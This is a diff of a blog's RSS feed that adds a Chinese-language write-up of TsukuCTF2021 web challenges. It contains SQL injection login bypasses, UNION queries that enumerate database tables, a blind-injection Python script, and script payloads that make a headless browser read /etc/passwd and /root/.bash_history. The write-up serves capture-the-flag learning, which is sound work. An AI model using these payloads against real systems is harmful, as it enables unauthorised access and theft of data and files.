@@ -1,4 +1,93 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AmiaaaZ's Site</title><link>https://amiaaaz.github.io/</link><description>Recent content on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 07 Sep 2021 11:22:14 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>GrabCONCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</link><pubDate>Tue, 07 Sep 2021 11:22:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</guid><description>&lt;h2 id="webe4sy-pe4sy">Web/E4sy Pe4sy&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AmiaaaZ's Site</title><link>https://amiaaaz.github.io/</link><description>Recent content on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 13 Sep 2021 19:15:21 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>TsukuCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</link><pubDate>Mon, 13 Sep 2021 19:15:21 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</guid><description>&lt;p>这两天又开始有点摆烂的迹象，于是把周末的ctf看看wp，水一水，复现一下&lt;/p>
+&lt;p>另外这个ctf最痛苦的地方在于是英日夹杂，我开始懂歪果仁做中文比赛页面的时候有多痛苦了&lt;/p>
+&lt;h2 id="weblogonly">Web/logonly&lt;/h2>
+&lt;p>给出的是一个有214155行的日志文件，只有第214154行返回200ok&lt;/p>
+&lt;p>显然是进行了一个字典攻击，在第214154次尝试时撞对了，我们下载一份kali里的rockyou.txt中看一下214154是个啥（有提示用到kali进行攻击）&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912171725965.png" alt="image-20210912171725965">&lt;/p>
+&lt;p>&lt;code>TsukuCTF{qwertyuiop[]\\}&lt;/code>&lt;/p>
+&lt;h2 id="webdigits">Web/digits&lt;/h2>
+&lt;p>一个fastapi站，但是要求不是很高的样子&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174109098.png" alt="image-20210912174109098">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174032687.png" alt="image-20210912174032687">&lt;/p>
+&lt;p>加号放到url中相当于半角空格&lt;/p>
+&lt;p>&lt;code>TsukuCTF{you_are_lucky_Tsukushi}&lt;/code>&lt;/p>
+&lt;h2 id="weblogin">Web/login&lt;/h2>
+&lt;p>登录框，万能密码&lt;code>admin'or 1#&lt;/code>&lt;/p>
+&lt;p>&lt;code>TsukuCTF{You_4r3_SUP3R_H4CKER}&lt;/code>&lt;/p>
+&lt;p>一般这种简单的登录都是万能密码，但是也得多试一试，加个注释符啊 分号什么的&lt;/p>
+&lt;h2 id="weblogin2">Web/login2&lt;/h2>
+&lt;p>说是代码重构过了&lt;/p>
+&lt;p>再用上面的万能密码登入会显示这个站的所有账号&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912175523340.png" alt="image-20210912175523340">&lt;/p>
+&lt;p>说明还是有sqli，尝试一下联合注入&lt;code>admin'or 1 union select null,null#&lt;/code>，跟上面是一样的回显，说明有两列，然后是愉快的注入（每一次的回显在页面的末尾，注意这个是最初要找到并确认的）&lt;/p>
+&lt;pre tabindex="0">&lt;code>admin'or 1 union select table_name,null from information_schema.columns#
+admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'#
+admin'or 1 union select secret,null from super_secret_table#
+&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}&lt;/code>&lt;/p>
+&lt;h2 id="weblogin3">Web/login3&lt;/h2>
+&lt;p>依然是存在sqli，用上面的两个payload都能回显正常，但是没有明确的信息，应该是需要盲注了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery_core&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;or ascii(substring((&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">),&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">,1))&amp;gt;=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">;#&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">),&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;ようこそ&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">page&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>
+&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">low&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
+&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">low&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">end&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select version()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct table_name from information_schema.columnns limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct column_name from information_shcema.columns where table_name=&amp;#39;urtla_secret_tsukushi&amp;#39;limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select secret from urtla_secret_tsukushi_limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是官方wp里的二分法脚本，把简单的事拆成了3个函数，倒是也好，可复用性max&lt;/p>
+&lt;p>&lt;code>TsukuCTF{U_Are_Geni0us_T$UKUSH1}&lt;/code>&lt;/p>
+&lt;h2 id="webjourney">Web/Journey&lt;/h2>
+&lt;p>抓包看，有很多307重定向，还以为是跟之前那个一样要跑一下一千多次的重定向，但是这个重定向是有限度的，最后的位置是/problems/journey/goal，回显405错误&lt;/p>
+&lt;p>看wp，学到了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -H &lt;span style="color:#d88200">&amp;#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1&amp;#39;&lt;/span> -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913114745032.png" alt="image-20210913114745032">&lt;/p>
+&lt;p>利用的是http请求中的connect方法，相关内容可参见-&amp;gt;&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT">CONNECT(MDN)&lt;/a> | &lt;a href="https://www.jianshu.com/p/54357cdd4736">HTTP之connect method&lt;/a>&lt;/p>
+&lt;h2 id="webgyotaku">Web/gyOTAKU&lt;/h2>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120544616.png" alt="image-20210913120544616">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120625401.png" alt="image-20210913120625401">&lt;/p>
+&lt;p>满足17行要求的话会通过chromium browser来返回一个截图&lt;/p>
+&lt;p>我们构造一个如下的html页面&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>返回500错误，再试一下&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/etc/passwd&amp;quot;&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>成功返回&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913190757615.png" alt="image-20210913190757615">&lt;/p>
+&lt;p>用一下我们的老朋友/root/.bash_history&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/.bash_history&amp;quot;&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913191326852.png" alt="image-20210913191326852">&lt;/p>
+&lt;p>可以读一下flag了&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/flagc464f9eba1.txt&amp;quot;&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}&lt;/code>&lt;/p>
+&lt;hr>
+&lt;p>水一篇wp，水水更健康&lt;/p></description></item><item><title>GrabCONCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</link><pubDate>Tue, 07 Sep 2021 11:22:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</guid><description>&lt;h2 id="webe4sy-pe4sy">Web/E4sy Pe4sy&lt;/h2>
 &lt;blockquote>
 &lt;p>Hack admin user!&lt;/p>
 &lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
